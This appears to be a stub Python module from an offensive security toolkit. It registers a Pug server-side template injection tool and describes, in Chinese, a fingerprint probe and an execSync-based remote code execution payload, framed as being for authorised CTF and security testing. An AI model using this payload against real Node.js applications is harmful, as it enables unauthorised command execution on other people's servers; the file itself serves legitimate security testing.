"""Pug SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: #{7*7}→49。
输入常被拼进模板源码: 换行另起一行输出语句 = global.process.mainModule.require('child_process').execSync(cmd).toString()
也可构造 - var x = ... 代码行;本质都是 JS 注入。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiPugTool(SstiEngineTool):
    name = "ssti_pug"
    description = "Pug(Node) SSTI:换行另起输出行 = execSync RCE(占位符)"
    engine_key = "pug"
    engine_name = "Pug"
    default_mode = "exec"
    plan = r"""指纹: #{7*7}→49。
输入常被拼进模板源码: 换行另起一行输出语句 = global.process.mainModule.require('child_process').execSync(cmd).toString()
也可构造 - var x = ... 代码行;本质都是 JS 注入。"""
